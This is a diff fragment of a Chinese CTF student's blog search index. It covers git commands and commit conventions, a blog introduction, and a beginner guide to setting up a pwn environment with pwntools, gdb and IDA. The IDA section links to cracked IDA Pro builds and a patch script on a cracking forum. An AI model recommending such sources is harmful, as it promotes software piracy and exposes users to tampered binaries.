class="comment">#查看当前所在分支</span></span><br><span class="line">git branch</span><br><span class="line"><span class="comment">#移动到一致的分支</span></span><br><span class="line">git checkout main</span><br><span class="line"><span class="comment">#合并分支(需要先移动到main分支)</span></span><br><span class="line">git checkout main</span><br><span class="line">git merge new_branch</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看日志</span></span><br><span class="line">git <span class="built_in">log</span> --oneline</span><br><span class="line"><span class="comment">#删除分支</span></span><br><span class="line">git branch -d branch_name</span><br><span class="line"><span class="comment">#如果分支是未被合并过的，需要强制删除</span></span><br><span class="line">git branch -D branch_name</span><br><span class="line"></span><br><span class="line"><span class="comment">#回溯到特定的提交（hash值在日志的左边会显示）</span></span><br><span class="line">git checkout commit_hash</span><br><span class="line"><span class="comment">#重置分支到特定提交</span></span><br><span class="line"><span class="comment">#1.软重置（保留更改）：</span></span><br><span class="line">    git reset --soft commit_hash</span><br><span class="line"><span class="comment">#2.混合重置（保留工作目录更改）：</span></span><br><span class="line">    git reset --mixed commit_hash</span><br><span class="line"><span class="comment">#3.硬重置（丢弃所有更改）：</span></span><br><span class="line">    git reset --hard commit_hash</span><br></pre></td></tr></table></figure><h2 id="commit的要求"><a class="markdownIt-Anchor" href="#commit的要求"></a> commit的要求</h2><p>commit有常见规范，不同的项目组可能不一样，下面给出常用的<br />这些需要在上面 <code>Initial commit</code> 的部分加前缀 (type:)</p><ul><li>feat: 新功能</li><li>fix/to: 修复bug</li><li>docs: 文档</li><li>style: 格式</li><li>refactor: 重构</li><li>perf: 优化相关，比如提升性能、体验</li><li>test: 添加测试</li><li>chore: 构造过程或辅助工具的变动</li><li>revert: 回滚到上一版本</li><li>merge: 代码合并</li><li>sync: 同步主线或分支的bug</li></ul><h2 id="注意事项"><a class="markdownIt-Anchor" href="#注意事项"></a> 注意事项</h2><p>在管理版本的过程中，要学会使用分支。<br />一是可以多人合作，方便管理与缩小每个人管理的项目跟上传的体积。<br />二是可以避免main分支的日志过长，难以回溯</p><p>如果你已经配置好了git，你完全可以使用SourceTree<br />更方便，不用专门记命令，但是命令行的还是记一下好一点<br />不推TortoiseGit是因为对于win11用户来说，右键菜单不太友好<br />(本人就是win11的呐)</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 教程 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 新手入门 </tag>
+            
+            <tag> github </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Alex介绍</title>
+      <link href="/2024/12/17/Alex%E4%BB%8B%E7%BB%8D/"/>
+      <url>/2024/12/17/Alex%E4%BB%8B%E7%BB%8D/</url>
+      
+        <content type="html"><![CDATA[<h2 id="alex博客介绍"><a class="markdownIt-Anchor" href="#alex博客介绍"></a> Alex博客介绍</h2><p>本博客由华南师范大学AlexD创建<br />希望大家能在这里学到更多<br />(更多是希望能带带新手呐)</p><h3 id="tips"><a class="markdownIt-Anchor" href="#tips"></a> tips</h3><p>由于本人为软件工程专业的ctfer, 所以博客中不只有pwn, 也有软件项目的相关内容<br />搜索时,<br />pwn有关文章题目由’pwn:'开头<br />软工项目有关由’sw:'开头</p><blockquote><p>sw指software</p></blockquote><p>所有的内容都有标签等进行分类, 可以快捷查看<br />本网站支持rss, 可以用rss阅读器订阅噢!<br /><a href="https://alexdkfighter.github.io/atom.xml">https://alexdkfighter.github.io/atom.xml</a></p><p>大家也可以去我的github看看(头像下面就有)<br />更多请到关于</p><h3 id="联系方式"><a class="markdownIt-Anchor" href="#联系方式"></a> 联系方式</h3><p>本人邮箱: <a href="mailto:13695242581@163.com">13695242581@163.com</a></p><h2 id="关于评论"><a class="markdownIt-Anchor" href="#关于评论"></a> 关于评论</h2><p>该页面是让新手进来不会蒙的, 评论就不给大家开了呐</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 教程 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 新手入门 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>pwn: pwn环境</title>
+      <link href="/2024/12/17/pwn/pwn%E7%8E%AF%E5%A2%83/"/>
+      <url>/2024/12/17/pwn/pwn%E7%8E%AF%E5%A2%83/</url>
+      
+        <content type="html"><![CDATA[<h1 id="pwn环境建造"><a class="markdownIt-Anchor" href="#pwn环境建造"></a> pwn环境建造</h1><h2 id="linux系统"><a class="markdownIt-Anchor" href="#linux系统"></a> linux系统</h2><p>我们在pwn方向，linux是必须的<br />我们有以下两个选择</p><ul><li>wsl (windows下的linux系统子系统)</li><li>VM 虚拟机<br />linux系统也有选择，通常情况下可以选择Ubuntu系统(出题人基本上都是Ubuntu编译)<br /><s>虽然我一直用kali</s><br />而且对于密码手而言，Arac linux 才是最优选择 (因为装sagemath更方便)</li></ul><h3 id="wsl"><a class="markdownIt-Anchor" href="#wsl"></a> wsl</h3><p>直接在微软商店搜索自己希望下载的linux系统, 下载即可<br />安装好之后就是可以使用的linux命令行 (windows10以来使用的为Terminal同一管理各种控制台)<br />可以去自己设计控制台的样式:<br /><img src="https://i.postimg.cc/pLwwfjfK/2024-12-17-192520.png" alt="kali运行界面" /><br /><img src="https://i.postimg.cc/k49LZdh4/2024-12-17-192554.png" alt="arch运行界面" /><br />右上角下箭头可以打开其他终端窗口，至于像我这样的界面怎么做，大家应该可以在设置里自己搞定吧<br /><s>图片上网找，反正全中文</s><br />tips: 记得把常用的比如我这里就是kali设置成默认启动，这样就可以在右键打开终端时直接在该文件夹下打开。<br />windows命令行不是一直在文件的路径窗口直接输入cmd运行的吗(bushi)<br />Arch… 我把sagemath装在~目录下就好了不是吗<br /><em>记得换源！</em><br /><em>记得换源！</em><br /><em>记得换源！</em></p><h3 id="vm虚拟机"><a class="markdownIt-Anchor" href="#vm虚拟机"></a> vm虚拟机</h3><p>这个没什么好说的，vm的虚拟机安装我也搞不懂，自己搞超多bug<br /><s>我不会呐</s><br /><strong>（等待大佬们补充）</strong></p><h3 id="pwn必备linux-下安装"><a class="markdownIt-Anchor" href="#pwn必备linux-下安装"></a> pwn必备(linux 下安装)</h3><p>pwntools (python库)<br />gdb (动态调试)<br />pwngdb (GDB插件)<br />ROPGadget (二进制文件查找工具)(跟着pwntools一同安装的)<br />patchelf (更改程序所使用的libc)<br />tips: 这里除了pwngdb必须从github以外, kali可以换源后apt下载<br />可以直接看这位师傅写的<br /><a href="https://www.cnblogs.com/VxerLee/p/15424937.html">[pwn基础]PWN环境搭建</a><br />这里需要你换源更新, 这样才能正常使用git，如果一直无法克隆，可以选择使用ssh进行克隆，当然这样可能会很麻烦，因为你需要进行相当多的配置<br /><a href="https://www.bilibili.com/video/BV1LT411D76z/?spm_id_from=333.337.search-card.all.click&amp;vd_source=eb45ed6f88c7bf4b9107819555b699ee">在Github上传你第一个项目【windows系统】(bilibili)</a><br />可以跟着这个视频来，配置完ssh的key之后基本就可以使用了</p><h3 id="另外"><a class="markdownIt-Anchor" href="#另外"></a> 另外:</h3><p>应该不会学这个连基本的命令行都不会的吧…<br />如果真的有可能需要恶补一下呢<br />主要是python跟git的部分优先掌握(git只要会克隆就可以了吧)</p><h2 id="ida"><a class="markdownIt-Anchor" href="#ida"></a> IDA</h2><p>在做题的时候当然也需要逆向我们收到的程序附件来进行分析啦<br />所以我们需要IDA的帮忙<br />以下有两个链接:<br /><a href="https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=1874203">IDA Pro 8.3 绿色版（2024.2.26更新） - 吾爱破解 - 52pojie.cn</a><br /><a href="https://www.52pojie.cn/thread-1970020-1-1.html">IDA Pro 9.0 RC1 全平台安装包 及 patch脚本 - 吾爱破解 - 52pojie.cn</a><br />(好像第二个要求吾爱破解的注册吧，还挺难的，不是要钱就是要等官网开放)<br />re手记得去找9.0的版本的(因为可能会遇到新特性，别因为这个卡题了)<br />但是对于pwn手来说8.3已经足够</p><h3 id="好用的插件"><a class="markdownIt-Anchor" href="#好用的插件"></a> 好用的插件</h3><p>auto_re 可以将一部分简单函数的函数名进行命名，从而增加可读性，虽然也就一点点。但比你每次看到sub_123984()还要去想他是不是system的后门函数好点。<br />LazyIDA 提供快捷复制地址，将字节串转为列表等，可以理解为增加快捷键的<br /><strong>(有待大佬们补充)</strong></p><h2 id="python脚本用什么写"><a class="markdownIt-Anchor" href="#python脚本用什么写"></a> python脚本用什么写？</h2><p>据我个人经历看来有以下四个选择:</p><ol><li>VS Code (不错的编辑器，也有很多插件)</li><li>Sublime Text (可以替代windows下的记事本，对代码自识别加着色) <em>这也是本人一直在用的，非常好使</em></li><li>Vim (佬编辑器，linux系统自带，各种命令，linux使用的时候肯定会用上一点点，但个人不是很推荐。主要是学习成本高，如果能学会的话确实用着很顺手)</li><li>记事本 (我真不说假的，你都用命令行了，用记事本不比IDLE打起来快)<br />这里的都是用来写脚本和小程序的，如果你要做项目请移步呐</li></ol><h2 id="qa"><a class="markdownIt-Anchor" href="#qa"></a> Q&amp;A</h2><ul><li><strong>用python什么版本比较好?</strong> 选3就可以了，虽然很多人说用python2。选2的好处在于大部分旧版的代码是2的，这时如果你要运行就需要用2，否则你需要做相当多的修改 (其实主要是print函数啦) 不过如果你的代码一直都是自己写的，那这玩意儿没啥关系 (我的代码会使用python3)</li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 教程 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 新手入门 </tag>
+            
+            <tag> pwn基础 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+  
+  
+</search>
